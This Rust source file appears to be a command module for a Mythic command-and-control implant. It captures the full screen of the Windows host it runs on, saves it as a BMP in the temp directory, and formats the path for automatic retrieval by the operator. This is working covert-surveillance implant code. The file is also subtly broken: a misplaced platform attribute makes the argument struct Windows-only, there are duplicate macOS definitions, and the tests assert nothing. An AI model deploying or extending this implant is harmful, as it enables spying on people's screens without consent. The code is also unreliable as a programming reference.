use serde::{Deserialize, Serialize};
use std::error::Error;
use std::result::Result;
use crate::AgentTask;

#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use winapi::shared::windef::HBITMAP;
#[cfg(target_os = "windows")]
use winapi::um::wingdi::*;
#[cfg(target_os = "windows")]
use winapi::um::winuser::*;
#[cfg(target_os = "windows")]

// Command structure for Mythic
#[derive(Serialize, Deserialize)]
pub struct ScreenshotArgs {}

// RPC message structures for file upload
#[derive(Serialize, Deserialize)]
struct MythicRPCPutFileMessage {
    pub task_id: String,
    pub file_contents: Vec<u8>,
    pub filename: Option<String>,
    pub is_screenshot: bool,
}

#[derive(Serialize, Deserialize)]
struct MythicRPCPutFileResponse {
    pub success: bool,
    pub error: Option<String>,
    pub agent_file_id: Option<String>,
}

/// Wrapper function for compatibility with the tasking system
pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args = ScreenshotArgs {};
    match execute_screenshot(args, &task.id) {
        Ok(output) => {
            Ok(serde_json::json!({
                "status": "success",
                "task_id": task.id,
                "output": output
            }))
        },
        Err(error) => {
            Ok(serde_json::json!({
                "status": "error",
                "task_id": task.id,
                "error": error
            }))
        },
    }
}

/// Take screenshots using Apollo's method - save locally and return file path for download
#[cfg(target_os = "windows")]
pub fn execute_screenshot(_args: ScreenshotArgs, _task_id: &str) -> Result<String, String> {
    unsafe {
        // Capture primary screen (Apollo's approach)
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);
        
        let hwnd_desktop = GetDesktopWindow();
        let hdc_screen = GetDC(hwnd_desktop);
        if hdc_screen.is_null() {
            return Err("Failed to get screen DC".to_string());
        }

        let hdc_mem = CreateCompatibleDC(hdc_screen);
        if hdc_mem.is_null() {
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err("Failed to create memory DC".to_string());
        }

        let hbitmap = CreateCompatibleBitmap(hdc_screen, width, height);
        if hbitmap.is_null() {
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err("Failed to create compatible bitmap".to_string());
        }

        // Select bitmap into memory DC
        let _old_bitmap = SelectObject(hdc_mem, hbitmap as *mut _);
        
        // Copy screen to our bitmap
        if BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY) == 0 {
            DeleteObject(hbitmap as *mut _);
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err("BitBlt failed".to_string());
        }

        // Save screenshot to file (Apollo's approach)
        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let filename = format!("screenshot_{}.bmp", timestamp);
        let screenshot_path = std::env::temp_dir().join(&filename);
        
        // Save bitmap to file
        if let Err(e) = save_bitmap_to_file(hbitmap, width as u32, height as u32, &screenshot_path) {
            DeleteObject(hbitmap as *mut _);
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err(format!("Failed to save bitmap: {}", e));
        }

        // Cleanup
        DeleteObject(hbitmap as *mut _);
        DeleteDC(hdc_mem);
        ReleaseDC(hwnd_desktop, hdc_screen);

        // Return file path in Apollo's format for automatic download
        Ok(format!(
            "screenshot_captured:{}:{}:{}:screenshot",
            screenshot_path.to_string_lossy(),
            std::fs::metadata(&screenshot_path).map(|m| m.len()).unwrap_or(0),
            filename
        ))
    }
}

/// Helper function: Save an HBITMAP to a .bmp file (Apollo's approach)
#[cfg(target_os = "windows")]
unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, file_path: &std::path::Path) -> Result<(), String> {
    use std::fs::File;
    use std::io::Write;
    
    // Calculate bitmap data size
    let bits_per_pixel = 24; // BMP uses 24-bit RGB
    let bytes_per_pixel = bits_per_pixel / 8;
    let row_size = ((width * bytes_per_pixel + 3) / 4) * 4; // 4-byte aligned
    let image_size = row_size * height;
    
    // Create BMP file header
    let file_size = 14 + 40 + image_size; // File header + Info header + Image data
    let mut bmp_header = vec![0u8; 14];
    bmp_header[0] = b'B';
    bmp_header[1] = b'M';
    bmp_header[2..6].copy_from_slice(&file_size.to_le_bytes());
    bmp_header[10..14].copy_from_slice(&54u32.to_le_bytes()); // Offset to image data
    
    // Create BMP info header
    let mut info_header = vec![0u8; 40];
    info_header[0..4].copy_from_slice(&40u32.to_le_bytes()); // Header size
    info_header[4..8].copy_from_slice(&(width as i32).to_le_bytes());
    info_header[8..12].copy_from_slice(&(height as i32).to_le_bytes());
    info_header[12..14].copy_from_slice(&1u16.to_le_bytes()); // Planes
    info_header[14..16].copy_from_slice(&(bits_per_pixel as u16).to_le_bytes());
    info_header[20..24].copy_from_slice(&image_size.to_le_bytes());
    
    // Get bitmap data
    let mut pixel_data = vec![0u8; image_size as usize];
    let hdc = GetDC(ptr::null_mut());
    
    let mut bmp_info = BITMAPINFO {
        bmiHeader: BITMAPINFOHEADER {
            biSize: 40,
            biWidth: width as i32,
            biHeight: height as i32,
            biPlanes: 1,
            biBitCount: bits_per_pixel as u16,
            biCompression: BI_RGB,
            biSizeImage: image_size,
            biXPelsPerMeter: 0,
            biYPelsPerMeter: 0,
            biClrUsed: 0,
            biClrImportant: 0,
        },
        bmiColors: [RGBQUAD {
            rgbBlue: 0,
            rgbGreen: 0,
            rgbRed: 0,
            rgbReserved: 0,
        }],
    };
    
    let result = GetDIBits(
        hdc,
        hbitmap,
        0,
        height,
        pixel_data.as_mut_ptr() as *mut _,
        &mut bmp_info,
        DIB_RGB_COLORS,
    );
    
    ReleaseDC(ptr::null_mut(), hdc);
    
    if result == 0 {
        return Err("GetDIBits failed".to_string());
    }
    
    // Write BMP file
    let mut file = File::create(file_path)
        .map_err(|e| format!("Failed to create file: {}", e))?;
    
    file.write_all(&bmp_header)
        .map_err(|e| format!("Failed to write header: {}", e))?;
    file.write_all(&info_header)
        .map_err(|e| format!("Failed to write info header: {}", e))?;
    file.write_all(&pixel_data)
        .map_err(|e| format!("Failed to write pixel data: {}", e))?;
    
    Ok(())
}

// macOS placeholder implementation
#[cfg(target_os = "macos")]
pub fn execute_screenshot(_args: ScreenshotArgs, _task_id: &str) -> Result<String, String> {
    Err("screenshot command is not implemented for macOS".to_string())
}

// Fallback for other platforms
#[cfg(not(target_os = "windows"))]
pub fn execute_screenshot(_args: ScreenshotArgs, _task_id: &str) -> Result<String, String> {
    Err("screenshot command is only supported on Windows".to_string())
}

/// Direct command handler for integration with command dispatch system
pub fn handle_screenshot_command(args: &str, task_id: &str) -> Result<String, String> {
    let screenshot_args: ScreenshotArgs = serde_json::from_str(args)
        .map_err(|e| format!("Failed to parse screenshot arguments: {}", e))?;
    
    execute_screenshot(screenshot_args, task_id)
}

// Note: RPC implementation is handled by the Python side
// The file upload mechanism works through Mythic's built-in file transfer system

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_screenshot_args_parsing() {
        let args = ScreenshotArgs {};
        // Just verify the struct can be created
        assert!(true);
    }

    #[test]
    fn test_screenshot_command_handler() {
        let result = handle_screenshot_command("{}", "test_task_id");
        // On non-Windows, this should return an error about platform not supported
        // On Windows, it might succeed or fail depending on the environment
        assert!(result.is_ok() || result.is_err());
    }
}